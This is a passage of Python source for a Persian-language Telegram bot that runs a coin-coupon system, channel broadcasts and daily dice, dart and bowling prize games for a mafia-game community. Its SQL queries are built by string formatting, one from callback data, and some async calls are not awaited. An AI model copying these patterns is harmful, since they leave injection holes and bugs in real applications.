        await context.bot.send_message(chat_id="5469541693", text=f'✅ مقدار {adad} سکه با موفقیت به پروفایل {pop}{ioi} اضافه شد')
        return ConversationHandler.END
    except:
        await update.message.reply_text('❌در حال حاضر امکان ارسال پیام به این کاربر وجود ندارد')
        return ConversationHandler.END



async def canvariz(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text("صفحه اصلی")
    return ConversationHandler.END



conv_handler21 = ConversationHandler(
    entry_points=[CallbackQueryHandler(variz, pattern=r'^k')],
    states={
        VAR: [MessageHandler(filters.TEXT & ~filters.COMMAND , variz2)],
        ConversationHandler.TIMEOUT:[MessageHandler(filters.TEXT, canvariz)]
    },
    fallbacks=[CommandHandler('cancel', canvariz)],
    conversation_timeout= 120
)




VAR2 = 1
async def variz11(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    # cdehh = context.user_data['cdehh'] 
    # cdehh = cdehh.split()
    # cdehh = cdehh[1]
    query = update.callback_query
    query.answer()
    cdehh = query.data
    context.user_data['cdehh'] = cdehh
    reply = ReplyKeyboardMarkup([['❌بازگشت']], resize_keyboard=True)
    await context.bot.send_message(chat_id=update.effective_chat.id, text='''کوپن سکه را ارسال کنید\n\nبا دستور createcoupen در منوی ربات مافیا(@dohatbot)میتونید کوپن سکه ایجاد کنید\n\nدر صورتی که چیزی غیر از کوپن یا کوپن نامعتبر ارسال کنید سکه ای به پروفایل شما اضافه نمیشود\n\nکوپن کمتر از 10 سکه قابل قبول نیست''', reply_markup=reply)
    return VAR2


async def variz12(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global keyboard
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    cdehh = context.user_data['cdehh'] 
    cdehh = cdehh.split()
    cdehh = cdehh[1]
    user_id = update.effective_user.id
    fff = c.execute(f"SELECT Khas FROM users WHERE user_id={user_id}")
    fff = c.fetchone()
    fff = fff[0]
    uu = c.execute(f"SELECT Lig FROM users WHERE user_id={user_id}")
    uu = c.fetchone()
    uu = uu[0]
    xsx = c.execute(f"SELECT coin FROM users WHERE user_id={cdehh}")
    xsx = c.fetchone()
    xsx = xsx[0]
    try:
        adad = update.message.text
        answer2 = f"kk {user_id}"
        button2 = InlineKeyboardButton("💷ارسال سکه💷", callback_data=answer2)
        keyboard2 = InlineKeyboardMarkup([[button2]])
        se = c.execute(f"SELECT myuser FROM users WHERE user_id={user_id}")
        se = c.fetchone()
        se = se[0]
        if se == 1:
            await context.bot.send_message(chat_id="5469541693", text=f'''💰درخواست واریز سکه
    {uu}{fff}
    {user_id}
    {adad}''', reply_markup=keyboard2)
            await update.message.reply_text('''لطفا صبور باشید تا ادمین آنلاین بشه
    در صورتی که کوپن ارسالی شما معتبر باشه سکه به پروفایل شما اضافه میشه''', reply_markup=reply_markup)
        else:
            await context.bot.send_message(chat_id="5571950188", text=f'''💰درخواست واریز سکه
    {uu}{fff}
    {user_id}
    {adad}''', reply_markup=keyboard2)
            await context.bot.send_message(chat_id="5469541693", text=f'''💰درخواست واریز سکه
    {uu}{fff}
    {user_id}
    {adad}''', reply_markup=keyboard2)
            await context.bot.send_message(chat_id="6967243537", text=f'''💰درخواست واریز سکه
    {uu}{fff}
    {user_id}
    {adad}''', reply_markup=keyboard2)
            await update.message.reply_text('''لطفا صبور باشید تا ادمین آنلاین بشه
    در صورتی که کوپن ارسالی شما معتبر باشه سکه به پروفایل شما اضافه میشه''', reply_markup=reply_markup)
        return ConversationHandler.END
    except:
        await update.message.reply_text('❌در حال حاضر امکان ارسال پیام به این کاربر وجود ندارد', reply_markup=reply_markup)
        return ConversationHandler.END



async def canvariz2(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global keyboard
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    await update.message.reply_text("صفحه اصلی", reply_markup=reply_markup)
    return ConversationHandler.END



conv_handler22 = ConversationHandler(
    entry_points=[CallbackQueryHandler(variz11, pattern=r'^c')],
    states={
        VAR2: [MessageHandler(filters.TEXT & ~filters.COMMAND & ~filters.Regex(r'^❌بازگشت$') , variz12),
        MessageHandler(filters.Regex(r'^❌بازگشت$'), canvariz2)],
        ConversationHandler.TIMEOUT:[MessageHandler(filters.TEXT, canvariz2)]
        
    },
    fallbacks=[CommandHandler('cancel', canvariz2)],
    conversation_timeout= 120
)




SENDING_MASSEGEALL = 1
async def MSA(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    if str(user_id) != "5469541693":
        for channel_id in CHANNEL_IDS:
            try:
                # استفاده از getChatMember برای بررسی وضعیت عضویت
                chat_member = await context.bot.get_chat_member(channel_id, user_id)
                # اگر کاربر عضو نباشه
                if chat_member.status in ['left', 'kicked']:
                    # ارسال پیام به کاربر
                    await context.bot.send_message(chat_id=user_id, text="""برای استفاده از قابلیت های ربات شما باید در کانال های زیر عضو باشید👇

@sahere_rasmi - کانال رسمی ساحره(اجباری)
@dohat_nime - کانال غیررسمی ساحره(اجباری)
@MhmdsCh - کانال شخصی من(غیر اجباری)""")
                    return ConversationHandler.END
            except Exception as e:
                # در صورت بروز خطا
                context.bot.send_message(chat_id=user_id, text="مشکلی در بررسی عضویت شما پیش آمده.")
                return ConversationHandler.END
    qq = c.execute(f"SELECT admin_block FROM users WHERE user_id={user_id}")
    qq = c.fetchone()
    qq = qq[0]
    if qq == 1:
        await context.bot.send_message(chat_id=user_id , text='❌شما توسط ادمین بن شدید، برای رفع بن به ادمین پیام بدید')
        return ConversationHandler.END
    uuc = c.execute(f"SELECT etc FROM users WHERE user_id=6364622155")
    uuc = c.fetchone()
    uuc = uuc[0]
    if uuc == 1:
        await context.bot.send_message(chat_id=user_id , text='🔐پیام همگانی توسط ادمین قفل شده است')
        return ConversationHandler.END
    hsc = c.execute(f"SELECT Lig FROM users WHERE user_id={user_id}")
    hsc = c.fetchone()
    hsc = hsc[0]
    nni = c.execute(f"SELECT roban FROM users WHERE user_id={user_id}")
    nni = c.fetchone()
    nni = nni[0]
    if hsc == '🎗' and nni != 1:
        await context.bot.send_message(chat_id=user_id , text='❌در حالت عادی لیگ ربان نمیتونه پیام همگانی ارسال کنه\n\nدرصورتی که فیک نیستید به ادمین پیام بدید')
        return ConversationHandler.END
    # words = update.message.text
    ff = c.execute(f"SELECT Khas FROM users WHERE user_id={user_id}")
    ff = c.fetchone()
    ff = ff[0]
    if ff == None:
        await update.message.reply_text('''❌برای ارسال پیام ربات نیاز داره که اسمت رو بدونه و شما هنوز ثبت نام نکردید!

برای ثبت نام کافیه وارد ربات مافیا @dohat32bot بشید دکمه پروفایل رو بزنید پروفایل رو برای این ربات فوروارد کنید(توجه کنید فوروارد!)تا ربات اسم و لیگت رو متوجه بشه و ذخیره کنه به همین سادگی
آموزش ویدیویی👇
/saptnamgif''')
        return ConversationHandler.END
    ll = '''پیامت رو بنویس✏️

پیام شما به صورت خودکار در کانال @dohat_nime ارسال میشود

🚫اخطار:در صورت هرگونه تبلیغ بدون اخطار بن میشد

آموزش ارسال بازی دوستانه مافیا👇
/sendbazi'''
    reply = ReplyKeyboardMarkup([['❌بازگشت']], resize_keyboard=True)
    await context.bot.send_message(chat_id=update.effective_chat.id, text=ll, reply_markup=reply)
    return SENDING_MASSEGEALL

async def MSA2(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global keyboard
    import sowal
    user_id = update.effective_user.id
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    fff = c.execute(f"SELECT Khas FROM users WHERE user_id={user_id}")
    fff = c.fetchone()
    fff = fff[0]
    uu = c.execute(f"SELECT Lig FROM users WHERE user_id={user_id}")
    uu = c.fetchone()
    uu = uu[0]
    today = datetime.date.today()
    go = today.strftime('%d')
    # Check if the user sent a sticker
    if update.message.sticker:
        sticker_file_id = update.message.sticker
        await context.bot.send_sticker(chat_id="-1002221581695", sticker=sticker_file_id)
        await context.bot.send_message(chat_id="-1002221581695", text=f"{uu}{fff}:")
        c.execute(f"UPDATE users SET Ham='{go}' WHERE user_id = ?", (user_id,))
        conn.commit()
        await context.bot.send_message(chat_id=update.effective_chat.id, text='استیکر شما ارسال شد\n\nمشاهده پیام👈 @dohat_nime', reply_markup=reply_markup)
        return ConversationHandler.END
    elif update.message.animation:
        gif_file_id = update.message.animation
        await context.bot.send_animation(chat_id="-1002221581695", animation=gif_file_id, caption=f"{uu}{fff}:")
        # await context.bot.send_message(chat_id="-1002221581695", text=f"{uu}{fff}:")
        c.execute(f"UPDATE users SET Ham='{go}' WHERE user_id = ?", (user_id,))
        conn.commit()
        await context.bot.send_message(chat_id=update.effective_chat.id, text='گیف شما ارسال شد\n\nمشاهده پیام👈 @dohat_nime', reply_markup=reply_markup)
        return ConversationHandler.END
    
    # Handle text messages
    harf = update.message.text
    if harf == '🌐پیام همگانی🌐':
        await context.bot.send_message(chat_id=update.effective_chat.id, text='یه بار بزن نوب', reply_markup=reply_markup)
        return ConversationHandler.END
    if sowal.sss != None:
        hwgi = sowal.sss.split()
        ii = hwgi[:-1]
        hju = ' '.join(ii)
        if harf == hju:
            await context.bot.send_message(chat_id="-1002221581695", text=f"""{uu}{fff}
                                           
🎉برنده شد!

✅جواب صحیح: {harf}

🤖 @sahere_bmola_bot""")
            vv = c.execute(f"SELECT coin FROM users WHERE user_id={user_id}")
            vv = c.fetchone()
            vv = vv[0]
            if vv == None:
                vv = 0
            yy = float(vv) + int(hwgi[-1])
            c.execute(f"UPDATE users SET coin={yy} WHERE user_id={user_id}")
            conn.commit()
            await context.bot.send_message(chat_id=update.effective_chat.id, text='🥳پاسخ درست دادی و سکه به پروفایلت اضافه شد!', reply_markup=reply_markup)
            sowal.sss = None
            return ConversationHandler.END
        else:
            await context.bot.send_message(chat_id=update.effective_chat.id, text="❌پاسخ اشتباه", reply_markup=reply_markup)
    await context.bot.send_message(chat_id="-1002221581695", text=f"{harf}\n\n{uu}{fff}")
    c.execute(f"UPDATE users SET Ham='{go}' WHERE user_id = ?", (user_id,))
    conn.commit()
    await context.bot.send_message(chat_id=update.effective_chat.id, text='✅پیامت ارسال شد\n\nمشاهده پیام👈 @dohat_nime', reply_markup=reply_markup)
    return ConversationHandler.END
async def MSA3(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global keyboard
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    await context.bot.send_message(chat_id=update.effective_chat.id, text='❎از قسمت پیام همگانی خارج شدید', reply_markup=reply_markup)
    return ConversationHandler.END
# TIMEOUT = 5

conv_handler7 = ConversationHandler(
    entry_points=[MessageHandler(filters.Regex(re.compile(r'^🌐 پیام همگانی$')), MSA)],
    states={
        SENDING_MASSEGEALL: [
            MessageHandler(filters.ALL & ~filters.Regex(r'^❌بازگشت$'), MSA2),
            MessageHandler(filters.Regex(r'^❌بازگشت$'), MSA3)
        ],
        ConversationHandler.TIMEOUT:[MessageHandler(filters.TEXT, MSA3)]
    },
    fallbacks=[],
    conversation_timeout=120
)








TAS = 1
async def shorotas(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    if str(user_id) != "5469541693":
        for channel_id in CHANNEL_IDS2:
            try:
                chat_member = await context.bot.get_chat_member(channel_id, user_id)
                if chat_member.status in ['left', 'kicked']:
                    await context.bot.send_message(chat_id=user_id, text='''برای تاس روزانه باید در کانال ها و گروه زیر عضو باشید👇

@sahere_rasmi - کانال رسمی ساحره
@dohat_nime - کانال غیررسمی ساحره''')
                    return ConversationHandler.END
            except Exception as e:
                context.bot.send_message(chat_id=user_id, text="مشکلی در بررسی عضویت شما پیش آمده.")
                return ConversationHandler.END
    ff = c.execute(f"SELECT Khas FROM users WHERE user_id={user_id}")
    ff = c.fetchone()
    ff = ff[0]
#     if ff == None:
#         await update.message.reply_text('''❌برای ارسال پیام ربات نیاز داره که اسمت رو بدونه و شما هنوز ثبت نام نکردید!

# برای ثبت نام کافیه پروفایل مافیاتون رو برای این ربات فوروارد کنید(توجه کنید فوروارد!)تا ربات اسم و لیگت رو متوجه بشه و ذخیره کنه به همین سادگی
# آموزش ویدیویی👇
# /saptnamgif''')
#         return ConversationHandler.END
    qq = c.execute(f"SELECT admin_block FROM users WHERE user_id={user_id}")
    qq = c.fetchone()
    qq = qq[0]
    if qq == 1:
        await context.bot.send_message(chat_id=user_id , text='❌شما توسط ادمین بن شدید، برای رفع بن به ادمین پیام بدید')
        return ConversationHandler.END
    po = c.execute(f"SELECT tas FROM users WHERE user_id={user_id}")
    po = c.fetchone()
    po = po[0]
    chham = c.execute(f"SELECT Ham FROM users WHERE user_id={user_id}")
    chham = c.fetchone()
    chham = chham[0]
    today = datetime.date.today()
    go = today.strftime('%d')
    tt = go.lstrip('0')
    if str(po) == str(tt):
        await context.bot.send_message(chat_id=user_id , text='❌شما امروز شانستون رو امتحان کردید، فردا میتونید دوباره تاس بندازید')
        return ConversationHandler.END
    if str(chham) != str(tt):
        await context.bot.send_message(chat_id=user_id , text='''❌برای تاس انداختن باید امروز حداقل یک پیام همگانی داده باشید
دکمه پیام همگانی رو بزنید و یک پیام بفرستید''')
        return ConversationHandler.END
    ll = '''🎲هر روز میتونید یک بار شانستون رو تو این قسمت امتحان کنید
دکمه تاس بزنید👇'''
    reply = ReplyKeyboardMarkup([['🎲'],['❌بازگشت']], resize_keyboard=True)
    await context.bot.send_message(chat_id=update.effective_chat.id, text=ll, reply_markup=reply)
    return TAS

prise_six = '''🎉تبریک

انتخاب جایزه برای برنده تاس شیش👇

🔹انتخاب اول: یک کوپن 3 سکه‌ای

🔹انتخاب دوم: یک مافیا پلیر تا آخر امشب به ربات دعوت میکنم و 5 برابر سکه بیشتری دریافت می‌کنم(یک کوپن 15 سکه ای)

⭕️نکته: اگه گزینه دو رو انتخاب کردی ولی بعداً نظرت عوض شد میتونی با پیام دادم به ادمین گزینه یک رو انتخاب کنی'''

prise_five = '''🎉تبریک

انتخاب جایزه برای برنده تاس پنج👇

🔸انتخاب اول: یک کوپن 2 سکه‌ای

🔸انتخاب دوم: یک مافیا پلیر تا آخر امشب به ربات دعوت میکنم و شیش برابر سکه بیشتری دریافت می‌کنم(یک کوپن 13 سکه ای)

⭕️نکته: اگه گزینه دو رو انتخاب کردی ولی بعداً نظرت عوض شد میتونی با پیام دادم به ادمین گزینه یک رو انتخاب کنی'''


moz = '''💔متاسفانه امروز برنده نشدید، فردا میتونید دوباره شانستون رو امتحان کنید

⭕️فقط تاس 6 جایزه دارد
تاس 6 = 6 سکه'''


async def tas(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global keyboard
    user_id = update.effective_user.id
    reply_markup = ReplyKeyboardMarkup(keyboard_daily, resize_keyboard=True)
    username = update.message.from_user.username
    ff = c.execute(f"SELECT Khas FROM users WHERE user_id={user_id}")
    ff = c.fetchone()
    ff = ff[0]
    uu = c.execute(f"SELECT Lig FROM users WHERE user_id={user_id}")
    uu = c.fetchone()
    uu = uu[0]
    vv = c.execute(f"SELECT coin FROM users WHERE user_id={user_id}")
    vv = c.fetchone()
    vv = vv[0]
    # ff = c.execute("SELECT tas FROM users WHERE user_id = ?", (user_id,))
    # ff = c.fetchone()
    # ff = ff[0]
    today = datetime.date.today()
    go = today.strftime('%d')
    if update.message.dice.value == 6:
        if vv == None:
            vv = 0
        yy = float(vv) + 3
        c.execute(f"UPDATE users SET coin={yy} WHERE user_id={user_id}")
        conn.commit()
        await context.bot.send_message(chat_id=update.effective_chat.id, text='🎉🎉🎉\n\nسکه به پروفایل شما اضافه شد✅\n\nمشاهده پروفایل👇\n/profile')
        # await context.bot.send_message(chat_id="-1002221581695", text=f'🎲🎲🎲\n\n{uu}{ff} شیش اوورد\n\n🤖ربات ساحره')
        await context.bot.send_message(chat_id="-1002221581695", text=f'🎲🎲🎲\n\n{uu}{ff}\n\nNEW WINNER OF DICE!!\n\n🤖@sahere_bmola_bot')
        await context.bot.send_message(chat_id="5469541693", text=f'تاس برنده شد🎲🎲\n\n{user_id}\n{ff}\n@{username}')
        bu = c.execute(f"SELECT etc FROM users WHERE user_id=5571950188")
        bu = c.fetchone()
        bu = bu[0]
        if bu == None:
            bu = 0
        nr = int(bu) + 3
        c.execute(f"UPDATE users SET etc={nr} WHERE user_id=5571950188")
        conn.commit()
        # button = InlineKeyboardButton("💰انتخاب اول💰", callback_data=f'TSO {user_id} {ff} {username}')
        # button2 = InlineKeyboardButton("💶انتخاب دوم💶", callback_data=f'TST {user_id} {ff} {username}')
        # keyboard2 = InlineKeyboardMarkup([[button2 , button]])
    #     await update.message.reply_text(text=prise_six, reply_markup=keyboard2)
    # elif update.message.dice.value == 5:
    #     if vv == None:
    #         vv = 0
    #     yy = int(vv) + 6
    #     c.execute(f"UPDATE users SET coin={yy} WHERE user_id={user_id}")
    #     conn.commit()
    #     await context.bot.send_message(chat_id=update.effective_chat.id, text='🎉🎉🎉\n\n6 سکه به پروفایل شما اضافه شد✅\n\nمشاهده پروفایل👇\n/profile')
    #     await context.bot.send_message(chat_id="5469541693", text=f'تاس برنده شد\n\n{user_id}\n{ff}\n@{username}')
    #     button = InlineKeyboardButton("💰انتخاب اول💰", callback_data=f'TFO {user_id} {ff} {username}')
    #     button2 = InlineKeyboardButton("💶انتخاب دوم💶", callback_data=f'TFT {user_id} {ff} {username}')
    #     keyboard2 = InlineKeyboardMarkup([[button2 , button]])
    #     await update.message.reply_text(text=prise_five, reply_markup=keyboard2)
    # elif update.message.dice.value == 4:
    #     if vv == None:
    #         vv = 0
    #     yy = int(vv) + 6
    #     c.execute(f"UPDATE users SET coin={yy} WHERE user_id={user_id}")
    #     conn.commit()
    #     await context.bot.send_message(chat_id=update.effective_chat.id, text='🎉🎉🎉\n\n6 سکه به پروفایل شما اضافه شد✅\n\nمشاهده پروفایل👇\n/profile')
    #     await context.bot.send_message(chat_id="5469541693", text=f'تاس برنده شد\n\n{user_id}\n{ff}\n@{username}')
    #     button = InlineKeyboardButton("💰انتخاب اول💰", callback_data=f'TCO {user_id} {ff} {username}')
    #     button2 = InlineKeyboardButton("💶انتخاب دوم💶", callback_data=f'TCT {user_id} {ff} {username}')
    #     keyboard2 = InlineKeyboardMarkup([[button2 , button]])
    #     await update.message.reply_text(text='چهار', reply_markup=keyboard2)
    else:
        await update.message.reply_text(moz)
        await context.bot.send_message(chat_id="5469541693", text=f'تاس برنده نشد\n\n{user_id}...{ff}...@{username}')
    c.execute(f"UPDATE users SET tas='{go}' WHERE user_id = ?", (user_id,))
    conn.commit()
    await context.bot.send_message(chat_id=update.effective_chat.id, text='🏠جایزه روزانه', reply_markup=reply_markup)
    return ConversationHandler.END

async def khtas(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global keyboard
    reply_markup = ReplyKeyboardMarkup(keyboard_daily, resize_keyboard=True)
    await context.bot.send_message(chat_id=update.effective_chat.id, text='🏠جایزه روزانه', reply_markup=reply_markup)
    return ConversationHandler.END


conv_handler9 = ConversationHandler(
    entry_points=[MessageHandler(filters.Regex(re.compile(r'^🎲🎲$')), shorotas)],
    states={
        TAS: [
            MessageHandler(filters.Dice.DICE & ~filters.Regex(r'^❌بازگشت$') & ~filters.FORWARDED, tas),
            MessageHandler(filters.TEXT, khtas)
        ],
        ConversationHandler.TIMEOUT:[MessageHandler(filters.TEXT, khtas)]
    },
    fallbacks=[],
    conversation_timeout=120
)


# async def tas_e(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
#     user_id = update.effective_user.id
#     query = update.callback_query
#     ff = c.execute(f"SELECT coin FROM users WHERE user_id={user_id}")
#     ff = c.fetchone()
#     ff = ff[0]
#     query.answer()
#     yt = query.data.split()
#     answer1 = f"ii {user_id}"
#     button2 = InlineKeyboardButton("پاسخ", callback_data=answer1)
#     keyboard2 = InlineKeyboardMarkup([[button2]])
#     await context.bot.delete_message(chat_id=update.effective_chat.id, message_id=update.callback_query.message.message_id)
#     await context.bot.send_message(chat_id="5469541693", text=f'{yt[0]}....{yt[1]}....{yt[2]}....@{yt[3]}', reply_markup=keyboard2)
#     if yt[0][1] == 'S':
#         if yt[0][2] == 'T':
#             await context.bot.send_message(chat_id=update.effective_chat.id, text='''تا ساعت 12 شب فرصت داری یک مافیا پلیر به ربات دعوت کنی تا پنج برابر سکه بیشتری دریافت کنی
# یعنی 15 سکه
# ⭕️نکته: مافیا پلیری که دعوت میکنید باید حداقل ۴۷۵۰ امتیاز یا همون لیگ 🎖 باشد
# ⭕️نکته: باید با لینک اختصاصی خودتون پلیر رو به ربات دعوت کنید.
# لینک دعوت شما👇
# /refral''')
#         elif yt[0][2] == 'O':
#             await context.bot.send_message(chat_id=update.effective_chat.id, text='✅بزودی کوپن سکه برای شما ارسال میشه')
#             if ff == None:
#                 ff = 0
#             yy = ff + 6
#             c.execute(f"UPDATE users SET coin={yy} WHERE user_id={user_id}")
#             conn.commit()
#             await context.bot.send_message(chat_id=update.effective_chat.id, text='سکه به حساب شما واریز شد')
#     elif yt[0][1] == 'F':
#         if yt[0][2] == 'T':
#             await context.bot.send_message(chat_id=update.effective_chat.id, text='''تا ساعت 12 شب فرصت داری یک مافیا پلیر به ربات دعوت کنی تا شیش برابر سکه بیشتری دریافت کنی(یک کوپن 13 سکه ای)
# ⭕️نکته: مافیا پلیری که دعوت میکنید باید حداقل ۴۷۵۰ امتیاز یا همون لیگ 🎖 باشد
# ⭕️نکته: باید با لینک اختصاصی خودتون پلیر رو به ربات دعوت کنید.
# لینک دعوت شما👇
# /refral''')
#         elif yt[0][2] == 'O':
#             await context.bot.send_message(chat_id=update.effective_chat.id, text='✅بزودی کوپن سکه برای شما ارسال میشه')



DART = 1
async def shorodart(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    if str(user_id) != "5469541693":
        for channel_id in CHANNEL_IDS3:
            try:
                # استفاده از getChatMember برای بررسی وضعیت عضویت
                chat_member = await context.bot.get_chat_member(channel_id, user_id)
                # اگر کاربر عضو نباشه
                if chat_member.status in ['left', 'kicked']:
                    # ارسال پیام به کاربر
                    await context.bot.send_message(chat_id=user_id, text="""❌برای جایزه روزانه دارت باید در کانال شخصی من عضو باشید👇

@Mhmdsch""")
                    return ConversationHandler.END
            except Exception as e:
                # در صورت بروز خطا
                context.bot.send_message(chat_id=user_id, text="مشکلی در بررسی عضویت شما پیش آمده.")
                return ConversationHandler.END
    ff = c.execute(f"SELECT Khas FROM users WHERE user_id={user_id}")
    ff = c.fetchone()
    ff = ff[0]
    if ff == None:
        await update.message.reply_text('''❌برای استفاده از این قابلیت ربات نیاز داره که اسمت رو بدونه و شما هنوز ثبت نام نکردید!
                                        
برای ثبت نام کافیه وارد ربات مافیا @dohat32bot بشید دکمه پروفایل رو بزنید پروفایل رو برای این ربات فوروارد کنید(توجه کنید فوروارد!)تا ربات اسم و لیگت رو متوجه بشه و ذخیره کنه به همین سادگی
آموزش ویدیویی👇
/saptnamgif''')
        return ConversationHandler.END
    start_time = datetime.time(hour=16, minute=30)
    end_time = datetime.time(hour=17, minute=30)
    # start_time = datetime.time(hour=21, minute=30)
    # end_time = datetime.time(hour=23, minute=50)

    now = datetime.datetime.now().time()
    qq = c.execute(f"SELECT admin_block FROM users WHERE user_id={user_id}")
    qq = c.fetchone()
    qq = qq[0]
    if qq == 1:
        await context.bot.send_message(chat_id=user_id , text='❌شما توسط ادمین بن شدید، برای رفع بن به ادمین پیام بدید')
        return ConversationHandler.END
    po = c.execute(f"SELECT Dart FROM users WHERE user_id={user_id}")
    po = c.fetchone()
    po = po[0]
    today = datetime.date.today()
    go = today.strftime('%d')
    tt = go.lstrip('0')
    if str(po) == str(tt):
        await context.bot.send_message(chat_id=user_id , text='❌شما امروز شانستون رو در دارت امتحان کردید، فردا میتونید دوباره دارت بزنید')
        return ConversationHandler.END
    ll = '''🎯هر روز میتونید یک بار شانستون رو تو این قسمت امتحان کنید
دکمه دارت بزنید👇'''
    reply = ReplyKeyboardMarkup([['🎯'],['❌بازگشت']], resize_keyboard=True)
    await context.bot.send_message(chat_id=update.effective_chat.id, text=ll, reply_markup=reply)
    return DART


moz1 = '💔متاسفانه امروز برنده نشدید، فردا میتونید دوباره شانستون رو امتحان کنید'


async def dart(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global keyboard
    user_id = update.effective_user.id
    reply_markup = ReplyKeyboardMarkup(keyboard_daily, resize_keyboard=True)
    username = update.message.from_user.username
    ff = c.execute(f"SELECT Khas FROM users WHERE user_id={user_id}")
    ff = c.fetchone()
    ff = ff[0]
    uu = c.execute(f"SELECT Lig FROM users WHERE user_id={user_id}")
    uu = c.fetchone()
    uu = uu[0]
    vv = c.execute(f"SELECT coin FROM users WHERE user_id={user_id}")
    vv = c.fetchone()
    vv = vv[0]
    # ff = c.execute("SELECT tas FROM users WHERE user_id = ?", (user_id,))
    # ff = c.fetchone()
    # ff = ff[0]
    today = datetime.date.today()
    go = today.strftime('%d')
    if update.message.dice.value == 6:
        if vv == None:
            vv = 0
        yy = float(vv) + 3
        c.execute(f"UPDATE users SET coin={yy} WHERE user_id={user_id}")
        conn.commit()
        await context.bot.send_message(chat_id=update.effective_chat.id, text='🎉🎉🎉\n\nسکه به پروفایل شما اضافه شد✅\n\nمشاهده پروفایل👇\n/profile')
        # await context.bot.send_message(chat_id="-1002221581695", text=f"🎯🎯🎯\n\n{uu}{ff} به هدف زد\n\n🤖ربات ساحره")
        await context.bot.send_message(chat_id="-1002221581695", text=f"🎯🎯🎯\n\n{uu}{ff}\n\nNEW WINNER OF DART!!\n\n🤖@sahere_bmola_bot")
        await context.bot.send_message(chat_id="5469541693", text=f'دارت برنده شد🎯🎯\n\n{user_id}\n{ff}\n@{username}')
        # bu = c.execute(f"SELECT etc FROM users WHERE user_id=5571950188")
        # bu = c.fetchone()
        # bu = bu[0]
        # if bu == None:
        #     bu = 0
        # nr = int(bu) + 3
        # c.execute(f"UPDATE users SET etc={nr} WHERE user_id=5571950188") 
        # conn.commit()
    else:
        await update.message.reply_text(moz1)
        await context.bot.send_message(chat_id="5469541693", text=f'دارت برنده نشد\n\n{user_id}...{ff}...@{username}')
    c.execute(f"UPDATE users SET Dart='{go}' WHERE user_id = ?", (user_id,))
    conn.commit()
    await context.bot.send_message(chat_id=update.effective_chat.id, text='🏠جایزه روزانه', reply_markup=reply_markup)
    return ConversationHandler.END

async def khdart(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global keyboard
    reply_markup = ReplyKeyboardMarkup(keyboard_daily, resize_keyboard=True)
    await context.bot.send_message(chat_id=update.effective_chat.id, text='🏠جایزه روزانه', reply_markup=reply_markup)
    return ConversationHandler.END


conv_handler11 = ConversationHandler(
    entry_points=[MessageHandler(filters.Regex(re.compile(r'^🎯🎯$')), shorodart)],
    states={
        DART: [
            MessageHandler(filters.Dice.DARTS & ~filters.Regex(r'^❌بازگشت$') & ~filters.FORWARDED, dart),
            MessageHandler(filters.TEXT, khdart)
        ],
        ConversationHandler.TIMEOUT:[MessageHandler(filters.TEXT, khdart)]
    },
    fallbacks=[],
    conversation_timeout=120
)



BOL = 1
async def shorobol(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    if str(user_id) != "5469541693":
        for channel_id in CHANNEL_IDS:
            try:
                # استفاده از getChatMember برای بررسی وضعیت عضویت
                chat_member = await context.bot.get_chat_member(channel_id, user_id)
                # اگر کاربر عضو نباشه
                if chat_member.status in ['left', 'kicked']:
                    # ارسال پیام به کاربر
                    await context.bot.send_message(chat_id=user_id, text="""برای استفاده از قابلیت های ربات شما باید در کانال های زیر عضو باشید👇

@sahere_rasmi - کانال رسمی ساحره(اجباری)
@dohat_nime - کانال غیررسمی ساحره(اجباری)
@MhmdsCh - کانال شخصی من(غیر اجباری)""")
                    return ConversationHandler.END
            except Exception as e:
                # در صورت بروز خطا
                context.bot.send_message(chat_id=user_id, text="مشکلی در بررسی عضویت شما پیش آمده.")
                return ConversationHandler.END
    ff = c.execute(f"SELECT Khas FROM users WHERE user_id={user_id}")
    ff = c.fetchone()
    ff = ff[0]
    if ff == None:
        await update.message.reply_text('''❌برای اسفاده از این قابلیت ربات نیاز داره که اسمت رو بدونه و شما هنوز ثبت نام نکردید!

برای ثبت نام کافیه وارد ربات مافیا @dohat32bot بشید دکمه پروفایل رو بزنید پروفایل رو برای این ربات فوروارد کنید(توجه کنید فوروارد!)تا ربات اسم و لیگت رو متوجه بشه و ذخیره کنه به همین سادگی
آموزش ویدیویی👇
/saptnamgif''')
        return ConversationHandler.END

    qq = c.execute(f"SELECT admin_block FROM users WHERE user_id={user_id}")
    qq = c.fetchone()
    qq = qq[0]
    if qq == 1:
        await context.bot.send_message(chat_id=user_id , text='❌شما توسط ادمین بن شدید، برای رفع بن به ادمین پیام بدید')
        return ConversationHandler.END
    ix = c.execute(f"SELECT ONER FROM users WHERE user_id={user_id}")
    ix = c.fetchone()
    ix = ix[0]
    if ix == None:
        await context.bot.send_message(chat_id=user_id , text='❌برای بولینگ زدن باید حداقل یک نفر رو به ربات دعوت کرده باشید\n\nلینک اختصاصی شما برای دعوت کردن👇\n/refral')
        return ConversationHandler.END
    po = c.execute(f"SELECT Bol FROM users WHERE user_id={user_id}")
    po = c.fetchone()
    po = po[0]
    today = datetime.date.today()
    go = today.strftime('%d')
    tt = go.lstrip('0')
    if str(po) == str(tt):
        await context.bot.send_message(chat_id=user_id , text='❌شما امروز شانستون رو در بولینگ امتحان کردید، فردا میتونید دوباره بولینگ بزنید')
        return ConversationHandler.END
    ll = '''🎳هر روز میتونید یک بار شانستون رو تو این قسمت امتحان کنید
دکمه بولینگ بزنید👇'''
